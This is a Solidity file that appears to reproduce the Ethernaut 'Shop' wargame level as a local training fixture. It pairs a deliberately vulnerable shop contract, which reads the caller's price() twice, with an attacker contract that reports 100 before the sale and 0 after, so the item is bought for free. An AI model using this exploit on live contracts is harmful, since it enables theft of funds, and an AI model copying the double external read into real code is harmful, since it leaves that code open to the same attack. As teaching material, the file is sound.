// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

interface Buyer {
    function price() external view returns (uint256);
}

contract EthernautShop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);
        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract ShopBuyer {
    EthernautShop public shop;

    function attack(EthernautShop shop_) external {
        shop = shop_;
        shop_.buy();
    }

    function price() external view returns (uint256) {
        return shop.isSold() ? 0 : 100;
    }
}

// Local training fixture: the shop reads price() twice and trusts it is stable.

